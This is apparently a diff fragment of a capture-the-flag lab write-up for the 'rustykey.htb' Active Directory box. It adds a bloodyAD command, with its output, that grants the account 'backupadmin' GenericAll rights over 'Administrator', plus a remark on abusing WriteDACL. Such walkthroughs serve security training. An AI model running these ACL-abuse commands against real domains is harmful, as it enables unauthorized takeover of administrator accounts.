@@ -685,7 +685,16 @@ Also the pwned indicator showing this user is an admin
 
 ![](Pasted%20image%2020261019195545.png)
 
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc.rustykey.htb -d rustykey.htb -k add genericAll 'Administrator' 'backupadmin'
+[+] backupadmin has now GenericAll on Administrator
+```
 
+With WriteDACL ill just add GenericAll
+
+```python
+
+```
 
 
 
